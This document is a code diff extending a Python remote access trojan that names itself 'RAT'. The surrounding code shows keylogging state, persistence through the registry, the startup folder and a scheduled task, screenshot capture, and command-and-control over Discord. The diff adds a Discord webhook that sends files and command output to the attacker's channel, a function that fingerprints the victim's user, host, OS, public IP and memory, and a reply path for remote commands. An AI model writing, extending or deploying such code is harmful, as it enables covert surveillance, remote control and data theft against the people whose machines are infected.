@@ -39,6 +39,7 @@ KEYLOG_ACTIVE = False
 KEYLOG_DATA = []
 CMDS_CHANNEL = None
 STATUS_CHANNEL = None
+CMDS_WEBHOOK = None
 PC_NAME = None
 
 def dprint(msg):
@@ -175,9 +176,8 @@ def send_webhook(text):
 
 def send_file(filename, file_data, channel_id=None):
     target = channel_id or CMDS_CHANNEL
-    if not target:
-        target = "webhook"
-    if target == "webhook":
+    wh_url = CMDS_WEBHOOK or WEBHOOK
+    if wh_url:
         boundary = base64.b16encode(os.urandom(16)).decode()
         body = b""
         body += f"--{{boundary}}\r\n".encode()
@@ -185,13 +185,13 @@ def send_file(filename, file_data, channel_id=None):
         body += b"Content-Type: application/octet-stream\r\n\r\n"
         body += file_data
         body += f"\r\n--{{boundary}}--\r\n".encode()
-        req = urllib.request.Request(WEBHOOK, data=body, headers={{
+        req = urllib.request.Request(wh_url, data=body, headers={{
             "Content-Type": f"multipart/form-data; boundary={{boundary}}"
         }}, method="POST")
         try:
             urllib.request.urlopen(req, timeout=30)
         except: pass
-    else:
+    elif target:
         boundary = base64.b16encode(os.urandom(16)).decode()
         payload_json = json.dumps({{"content": f"[FILE] {{filename}}"}})
         body = b""
@@ -212,7 +212,7 @@ def send_file(filename, file_data, channel_id=None):
         except: pass
 
 def setup_channels():
-    global CMDS_CHANNEL, STATUS_CHANNEL
+    global CMDS_CHANNEL, STATUS_CHANNEL, CMDS_WEBHOOK
     pc = get_pc_id()
     dprint(f"Setting up channels for {{pc}}")
     channels = discord_api("GET", f"/guilds/{{GUILD}}/channels")
@@ -256,6 +256,20 @@ def setup_channels():
         dprint(f"status channel created: {{status_id}}")
     CMDS_CHANNEL = str(cmds_id)
     STATUS_CHANNEL = str(status_id)
+    webhooks = discord_api("GET", f"/channels/{{CMDS_CHANNEL}}/webhooks")
+    wh_list = webhooks if isinstance(webhooks, list) else []
+    if wh_list:
+        CMDS_WEBHOOK = f"https://discord.com/api/webhooks/{{wh_list[0]['id']}}/{{wh_list[0]['token']}}"
+        dprint(f"Using existing webhook")
+    else:
+        wh = discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/webhooks", {{"name": "RAT"}})
+        wh_id = wh.get("id")
+        wh_token = wh.get("token")
+        if wh_id and wh_token:
+            CMDS_WEBHOOK = f"https://discord.com/api/webhooks/{{wh_id}}/{{wh_token}}"
+            dprint(f"Created webhook: {{wh_id}}")
+        else:
+            dprint(f"Webhook creation failed: {{wh}}, using bot token fallback")
     dprint(f"Ready: cmds={{CMDS_CHANNEL}} status={{STATUS_CHANNEL}}")
     return True
 
@@ -329,6 +343,29 @@ def persist():
         dprint("Persistence complete (registry + startup + scheduled task)")
     except Exception as e:
         dprint(f"Persist error: {{e}}")
+
+def get_info():
+    info = {{"user": os.getenv("USERNAME", "?"), "computer": platform.node(), "os": platform.platform(), "ip": "?", "cwd": os.getcwd(), "python": platform.python_version()}}
+    try:
+        info["ip"] = urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
+    except: pass
+    try:
+        r = subprocess.run("wmic os get FreePhysicalMemory /Value", shell=True, capture_output=True, text=True, timeout=5)
+        for line in r.stdout.split("\\n"):
+            if "FreePhysicalMemory" in line and "=" in line:
+                kb = int(line.split("=")[1].strip())
+                info["ram_free"] = f"{{kb/1048576:.1f}} GB"
+    except: pass
+    try:
+        r = subprocess.run("wmic os get TotalVisibleMemorySize /Value", shell=True, capture_output=True, text=True, timeout=5)
+        for line in r.stdout.split("\\n"):
+            if "TotalVisibleMemorySize" in line and "=" in line:
+                kb = int(line.split("=")[1].strip())
+                info["ram_total"] = f"{{kb/1048576:.1f}} GB"
+    except: pass
+    return info
+
+CMDS_WEBHOOK = None
 
 def take_screenshot():
     tmp = os.path.join(os.getenv("TEMP", "."), "rat_screen.bmp")
@@ -1042,7 +1079,15 @@ def main():
                                 if cmd:
                                     dprint(f"CMD from {{author.get('username','?')}}: {{cmd}}")
                                     result = handle_command(cmd)
-                                    discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": f"```\\n{{result}}\\n```"}})
+                                    resp = f"```\\n{{result}}\\n```"
+                                    if CMDS_WEBHOOK:
+                                        data = {{"content": resp[:2000]}}
+                                        body = json.dumps(data).encode("utf-8")
+                                        req = urllib.request.Request(CMDS_WEBHOOK, data=body, headers={{"Content-Type": "application/json"}}, method="POST")
+                                        try: urllib.request.urlopen(req, timeout=10)
+                                        except: pass
+                                    else:
+                                        discord_api("POST", f"/channels/{{CMDS_CHANNEL}}/messages", {{"content": resp[:2000]}})
                             elif content:
                                 dprint(f"MSG (no prefix): {{content[:60]}}")
                 elif op == 7:
